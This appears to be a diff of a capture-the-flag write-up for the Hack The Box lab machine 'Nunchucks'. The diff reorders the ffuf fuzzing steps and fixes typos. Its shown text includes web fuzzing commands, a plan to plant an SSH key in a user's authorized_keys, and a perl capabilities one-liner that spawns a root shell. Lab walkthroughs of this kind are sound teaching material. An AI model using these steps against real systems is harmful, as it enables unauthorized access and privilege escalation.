@@ -239,35 +239,51 @@ There's also a `scripts.js` file that could be interesting, but it only contains
 
 ### Directory fuzzing
 
-Let's see if we can find unliked folders.
+Let's see if we can find unliked files.
 
 ```sh
-❯ ffuf -v -c -u https://nunchucks.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt -maxtime 60
+❯ ffuf -v -c -u https://nunchucks.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files.txt -maxtime 60
 ```
 
 ```
 <SNIP>
-[Status: 200, Size: 45, Words: 4, Lines: 4, Duration: 32ms]
-| URL | https://nunchucks.htb/stats
-    * FUZZ: stats
+[Status: 200, Size: 45, Words: 4, Lines: 4, Duration: 28ms]
+| URL | https://nunchucks.htb/postings.php
+    * FUZZ: postings.php
 
-[Status: 200, Size: 45, Words: 4, Lines: 4, Duration: 32ms]
-| URL | https://nunchucks.htb/plugins
-    * FUZZ: plugins
+[Status: 200, Size: 45, Words: 4, Lines: 4, Duration: 28ms]
+| URL | https://nunchucks.htb/report.php
+    * FUZZ: report.php
 
-[Status: 200, Size: 45, Words: 4, Lines: 4, Duration: 32ms]
-| URL | https://nunchucks.htb/administrator
-    * FUZZ: administrator
+[Status: 200, Size: 45, Words: 4, Lines: 4, Duration: 24ms]
+| URL | https://nunchucks.htb/usercp.php
+    * FUZZ: usercp.php
+
+[Status: 200, Size: 45, Words: 4, Lines: 4, Duration: 23ms]
+| URL | https://nunchucks.htb/editpost.php
+    * FUZZ: editpost.php
+
+[Status: 200, Size: 45, Words: 4, Lines: 4, Duration: 24ms]
+| URL | https://nunchucks.htb/CHANGELOG.txt
+    * FUZZ: CHANGELOG.txt
 <SNIP>
 ```
 
-Okay, so there's a actually a default web page that gets displayed when the specify an invalid one. Let's browse to `https://nunchucks.htb/nonExistent` to see it:
+Okay, so there's actually a default web page that gets displayed when the specify an invalid one. Let's browse to `https://nunchucks.htb/nonExistent` to see it:
 
 ![Domain 404 page](domain-404-page.png)
 
 This is a really barebone web page.
 
 Let's fuzz again, but this time we'll ignore the responses with the length of the default `404` web page.
+
+```sh
+❯ ffuf -v -c -u https://nunchucks.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files.txt -maxtime 60 -fs 45
+```
+
+We find nothing at all!
+
+Let's check directories now.
 
 ```sh
 ❯ ffuf -v -c -u https://nunchucks.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt -maxtime 60 -fs 45
@@ -331,13 +347,7 @@ Let's fuzz again, but this time we'll ignore the responses with the length of th
 <SNIP>
 ```
 
-Nothing new here. What about files then?
-
-```sh
-❯ ffuf -v -c -u https://nunchucks.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files.txt -maxtime 60 -fs 45
-```
-
-We find nothing at all!
+Nothing new here.
 
 ### Subdomain fuzzing
 
@@ -567,14 +577,14 @@ Let's run `whoami` to see who we are:
 david
 ```
 
-Luckily, if we check the `/home/` folder, we see that `david` has a home folder.
+Luckily, if we check `/home`, we see that `david` has a home folder.
 
 The goal is now to add our own SSH key to `/home/david/.ssh/authorized_keys` so that we can connect to Nunchucks using SSH.
 
 However, `david` doesn't have a `.ssh` folder, so let's remediate to that:
 
 ```sh
-> mkdir /home/david/.ssh/
+> mkdir /home/david/.ssh
 ```
 
 Then, I'll generate a SSH ed25519 key.
@@ -1097,7 +1107,7 @@ The thing is that only `root` is allowed to write into `/opt/web_backups/`, so t
 
 To do this, it must either be SUID or have a capability. We discovered earlier that `/usr/bin/perl` has capabilities to change its ID, so we should be able to use it to get a shell as `root`!
 
-We can use [GTFOBins](https://gtfobins.github.io/) for that. It has one entry for [perl](https://gtfobins.github.io/gtfobins/perl/), and even gives a payload to abuse [Capabilities](https://gtfobins.github.io/gtfobins/perl/#capabilities)! Let's try it.
+We can use [GTFOBins](https://gtfobins.github.io/) for that. It has one entry for [perl](https://gtfobins.github.io/gtfobins/perl/), and it even gives a payload to abuse [Capabilities](https://gtfobins.github.io/gtfobins/perl/#capabilities)! Let's try it.
 
 ```sh
 david@nunchucks:~$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
